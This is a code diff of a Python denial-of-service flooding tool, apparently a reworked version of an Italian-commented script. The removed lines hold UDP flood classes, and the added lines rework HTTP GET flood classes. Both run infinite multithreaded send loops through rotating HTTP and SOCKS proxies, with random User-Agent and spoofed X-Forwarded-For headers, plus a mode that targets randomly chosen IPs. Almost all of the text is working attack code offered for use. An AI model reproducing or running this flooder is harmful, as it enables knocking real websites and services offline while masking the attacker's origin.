-				s.close() # lo ignora e ricomincia il ciclo
-
-class UdpFloodProxed(threading.Thread): # la classe del multithreading
-
-	def __init__(self, counter): # funzione messa su praticamente solo per il counter dei threads. Il parametro counter della funzione, passa l'x+1 di sopra come variabile counter
-		threading.Thread.__init__(self)
-		self.counter = counter
-
-	def run(self): # la funzione che da' le istruzioni ai vari threads
-		data = random._urandom(1024) # data per il pacchetto random
-		p = bytes(IP(dst=str(url2))/UDP(dport=int(port))/data) # crea pacchetto udp classico + data
-		current = x # per dare l'id al thread
-		if current < len(proxies): # se l'id del thread si puo' associare ad un proxy, usa quel proxy
-			proxy = proxies[current].strip().split(':')
-		else: # altrimenti lo prende a random
-			proxy = random.choice(proxies).strip().split(":")
-		go.wait() # aspetta che threads sono pronti
-		while True:
-			try:
-				socks.setdefaultproxy(socks.PROXY_TYPE_HTTP, str(proxy[0]), int(proxy[1]), True) # comando per il proxying HTTP
-				s = socks.socksocket() # creazione socket
-				s.connect((str(url2),int(port))) # connessione
-				s.send(p) # invio
-				print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print req + counter
-				try: # invia altre richieste nello stesso thread
-					for y in range(multiple): # fattore di moltiplicazione
-						s.send(str.encode(p)) # encode in bytes della richiesta HTTP
-				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
-					s.close()
-			except: # se qualcosa va storto
-				s.close() # chiude il socket
-
-class UdpFloodSocked(threading.Thread): # la classe del multithreading
-
-	def __init__(self, counter): # funzione messa su praticamente solo per il counter dei threads. Il parametro counter della funzione, passa l'x+1 di sopra come variabile counter
-		threading.Thread.__init__(self)
-		self.counter = counter
-
-	def run(self): # la funzione che da' le istruzioni ai vari threads
-		data = random._urandom(1024) # data per il pacchetto random
-		p = bytes(IP(dst=str(url2))/UDP(dport=int(port))/data) # crea pacchetto udp classico + data
-		current = x # per dare l'id al thread
-		if current < len(proxies): # se l'id del thread si puo' associare ad un proxy, usa quel proxy
-			proxy = proxies[current].strip().split(':')
-		else: # altrimenti lo prende a random
-			proxy = random.choice(proxies).strip().split(":")
-		go.wait() # aspetta che threads siano pronti
-		while True:
-			try:
-				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True) # comando per il proxying con SOCKS
-				s = socks.socksocket() # creazione socket
-				s.connect((str(url2),int(port))) # connessione
-				s.send(p) # invio
-				print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # req + counter
-				try: # invia altre richieste nello stesso thread
-					for y in range(multiple): # fattore di moltiplicazione
-						s.send(str.encode(p)) # encode in bytes della richiesta HTTP
-				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
-					s.close()
-			except: # se qualcosa va storto questo except chiude il socket e si collega al try sotto
-				s.close() # intanto chiude il precedente socket non funzionante
-				try:
-					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True) # poi prova ad utilizzare SOCKS4, magari e' questo il problema dell'errore
-					s = socks.socksocket() # creazione socket
-					s.connect((str(url2),int(port))) # connessione
-					s.send(p) # invio
-					print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # req + counter
-					try: # invia altre richieste nello stesso thread
-						for y in range(multiple): # fattore di moltiplicazione
-							s.send(str.encode(p)) # encode in bytes della richiesta HTTP
-					except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
-						s.close()
-				except: # se nemmeno questo funge, allora il sock e' down
-					print ("Sock down. Retrying request. @", self.counter)
-					s.close() # chiude il socket e ricomincia ciclo
-
-class UdpFloodDefault(threading.Thread): # la classe del multithreading
-
-	def __init__(self, counter): # funzione messa su praticamente solo per il counter dei threads. Il parametro counter della funzione, passa l'x+1 di sopra come variabile counter
-		threading.Thread.__init__(self)
-		self.counter = counter
-
-	def run(self): # la funzione che da' le istruzioni ai vari threads
-		data = random._urandom(1024) # data per il pacchetto random
-		p = bytes(IP(dst=str(url2))/UDP(dport=int(port))/data) # crea pacchetto udp classico + data
-		go.wait() # aspetta che i threads siano pronti
-		while True: # ciclo infinito
-			try: # il try per non far chiudere il programma se si verifica qualche errore
-				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # creazione socket
-				s.connect((str(url2),int(port))) # connessione al target
-				s.send(p) # questo manda il pacchetto udp creato al target
-				print ("Request Sent! @", self.counter) # print req + counter
-				try: # invia altre richieste nello stesso thread
-					for y in range(multiple): # fattore di moltiplicazione
-						s.send(str.encode(p)) # encode in bytes della richiesta HTTP
-				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
-					s.close()
-			except: # se si verifica un errore
-				s.close() # lo ignora e ricomincia il ciclo
-
-class RequestProxyHTTP(threading.Thread): # la classe del multithreading
-
-	def __init__(self, counter): # funzione messa su praticamente solo per il counter dei threads. Il parametro counter della funzione, passa l'x+1 di sopra come variabile counter
-		threading.Thread.__init__(self)
-		self.counter = counter
-
-	def run(self): # la funzione che da' le istruzioni ai vari threads
-		useragent = "User-Agent: " + random.choice(useragents) + "\r\n" # scelta useragent a caso
-		accept = random.choice(acceptall) # scelta header accept a caso
+	def run(self): 
+		useragent = "User-Agent: " + random.choice(useragents) + "\r\n" 
+		accept = random.choice(acceptall) 
 		randomip = str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
-		forward = "X-Forwarded-For: " + randomip + "\r\n" # X-Forwarded-For, un header HTTP che permette di incrementare anonimato (vedi google per info)
-		request = get_host + useragent + accept + forward + connection + "\r\n" # ecco la final request
-		current = x # per dare l'id al thread
-		if current < len(proxies): # se l'id del thread si puo' associare ad un proxy, usa quel proxy
+		forward = "X-Forwarded-For: " + randomip + "\r\n" 
+		if numberAttack == "1":
+			ip = random.choice(ips)
+			get_host = "GET " + ip + " HTTP/1.1\r\nHost: " + ip + "\r\n"
+		else:
+			get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
+		request = get_host + useragent + accept + forward + connection + "\r\n" 
+		current = x
+		if current < len(proxies): 
 			proxy = proxies[current].strip().split(':')
-		else: # altrimenti lo prende a random
+		else: 
 			proxy = random.choice(proxies).strip().split(":")
-		go.wait() # aspetta che i threads siano pronti
-		while True: # ciclo infinito
+		go.wait()
+		while True: 
 			try:
-				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # ecco il nostro socket
-				s.connect((str(proxy[0]), int(proxy[1]))) # connessione al proxy
-				s.send(str.encode(request)) # encode in bytes della richiesta HTTP
-				print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print delle richieste
-				try: # invia altre richieste nello stesso thread
-					for y in range(multiple): # fattore di moltiplicazione
-						s.send(str.encode(request)) # encode in bytes della richiesta HTTP
-				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
+				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+				s.connect((str(proxy[0]), int(proxy[1]))) 
+				s.send(str.encode(request)) 
+				print (f"{lrd}[{lgn}+{lrd}]{gn} The request was made by {lgn}{str(proxy[0])}:{str(proxy[1])}{yw} => {cn}{self.counter}")
+				try: 
+					for y in range(multiple): 
+						s.send(str.encode(request)) 
+				except: 
 					s.close()
 			except:
-				s.close() # se qualcosa va storto, chiude il socket e il ciclo ricomincia
+				s.close()
 
-class RequestSocksHTTP(threading.Thread): # la classe del multithreading
+class RequestSocksHTTP(threading.Thread): 
 
-	def __init__(self, counter): # funzione messa su praticamente solo per il counter dei threads. Il parametro counter della funzione, passa l'x+1 di sopra come variabile counter
+	def __init__(self, counter): 
 		threading.Thread.__init__(self)
 		self.counter = counter
 
-	def run(self): # la funzione che da' le istruzioni ai vari threads
-		useragent = "User-Agent: " + random.choice(useragents) + "\r\n" # scelta proxy a caso
-		accept = random.choice(acceptall) # scelta accept a caso
-		request = get_host + useragent + accept + connection + "\r\n" # composizione final request
-		current = x # per dare l'id al thread
-		if current < len(proxies): # se l'id del thread si puo' associare ad un proxy, usa quel proxy
+	def run(self): 
+		useragent = "User-Agent: " + random.choice(useragents) + "\r\n" 
+		accept = random.choice(acceptall) 
+		if numberAttack == "1":
+			ip = random.choice(ips)
+			get_host = "GET " + ip + " HTTP/1.1\r\nHost: " + ip + "\r\n"
+		else:
+			get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
+		request = get_host + useragent + accept + connection + "\r\n" 
+		current = x 
+		if current < len(proxies):
 			proxy = proxies[current].strip().split(':')
-		else: # altrimenti lo prende a random
+		else: 
 			proxy = random.choice(proxies).strip().split(":")
-		go.wait() # aspetta che threads siano pronti
+		go.wait() 
 		while True:
 			try:
-				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True) # comando per proxarci con i socks
-				s = socks.socksocket() # creazione socket con pysocks
-				s.connect((str(url2), int(urlport))) # connessione
-				s.send (str.encode(request)) # invio
-				print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print req + counter
-				try: # invia altre richieste nello stesso thread
-					for y in range(multiple): # fattore di moltiplicazione
-						s.send(str.encode(request)) # encode in bytes della richiesta HTTP
-				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
+				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True) 
+				s = socks.socksocket() 
+				s.connect((str(url2), int(urlport))) 
+				s.send (str.encode(request)) 
+				print (f"{lrd}[{lgn}+{lrd}]{gn} The request was made by {lgn}{str(proxy[0])}:{str(proxy[1])}{yw} => {cn}{self.counter}")
+				try: 
+					for y in range(multiple): 
+						s.send(str.encode(request)) 
+				except: 
 					s.close()
-			except: # se qualcosa va storto questo except chiude il socket e si collega al try sotto
-				s.close() # chiude socket
-				try: # il try prova a vedere se l'errore e' causato dalla tipologia di socks errata, infatti prova con SOCKS4
-					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True) # prova con SOCKS4
-					s = socks.socksocket() # creazione nuovo socket
-					s.connect((str(url2), int(urlport))) # connessione
-					s.send (str.encode(request)) # invio
-					print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print req + counter
-					try: # invia altre richieste nello stesso thread
-						for y in range(multiple): # fattore di moltiplicazione
-							s.send(str.encode(request)) # encode in bytes della richiesta HTTP
-					except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
+			except: 
+				s.close() 
+				try: 
+					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True) 
+					s = socks.socksocket() 
+					s.connect((str(url2), int(urlport))) 
+					s.send (str.encode(request)) 
+					print (f"{lrd}[{lgn}+{lrd}]{gn} The request was made by {lgn}{str(proxy[0])}:{str(proxy[1])}{yw} => {cn}{self.counter}")
+					try: 
+						for y in range(multiple): 
+							s.send(str.encode(request)) 
+					except: 
 						s.close()
 				except:
-					print ("Sock down. Retrying request. @", self.counter)
-					s.close() # se nemmeno con quel try si e' riuscito a inviare niente, allora il sock e' down e chiude il socket.
+					print (f"{lrd}[{rd}-{lrd}]{rd} Your packet was lost {yw}{self.counter}")
+					s.close() 
 
-class RequestDefaultHTTP(threading.Thread): # la classe del multithreading
+class HTTPREQ(threading.Thread): 
 
-	def __init__(self, counter): # funzione messa su praticamente solo per il counter dei threads. Il parametro counter della funzione, passa l'x+1 di sopra come variabile counter
+	def __init__(self, counter): 
 		threading.Thread.__init__(self)
 		self.counter = counter
 
-	def run(self): # la funzione che da' le istruzioni ai vari threads
-		useragent = "User-Agent: " + random.choice(useragents) + "\r\n" # useragent a caso
-		accept = random.choice(acceptall) # accept a caso
-		request = get_host + useragent + accept + connection + "\r\n" # composizione final request
-		go.wait() # aspetta che i threads siano pronti
+	def run(self): 
+		useragent = "User-Agent: " + random.choice(useragents) + "\r\n" 
+		accept = random.choice(acceptall) 
+		if numberAttack == "1":
+			ip = random.choice(ips)
+			get_host = "GET " + ip + " HTTP/1.1\r\nHost: " + ip + "\r\n"
+		else:
+			get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
+		request = get_host + useragent + accept + connection + "\r\n" 
+		go.wait() 
 		while True:
 			try:
-				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # creazione socket
-				s.connect((str(url2), int(urlport))) # connessione
-				s.send (str.encode(request)) # invio
-				print ("Request sent! @", self.counter) # print req + counter
-				try: # invia altre richieste nello stesso thread
-					for y in range(multiple): # fattore di moltiplicazione
-						s.send(str.encode(request)) # encode in bytes della richiesta HTTP
-				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
+				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+				s.connect((str(url2), int(urlport))) 
+				s.send (str.encode(request)) 
+				print (f"{lrd}[{lgn}+{lrd}]{gn} Request sent {lgn}{self.counter}") 
+				try: 
+					for y in range(multiple): 
+						s.send(str.encode(request)) 
+				except: 
 					s.close()
-			except: # se qualcosa va storto
-				s.close() # chiude socket e ricomincia
+			except: 
+				s.close() 
 
-
-if __name__ == '__main__':
-	starturl() # questo fa startare la prima funzione del programma, che a sua volta ne starta un altra, poi un altra, fino ad arrivare all'attacco.
+attacker() 
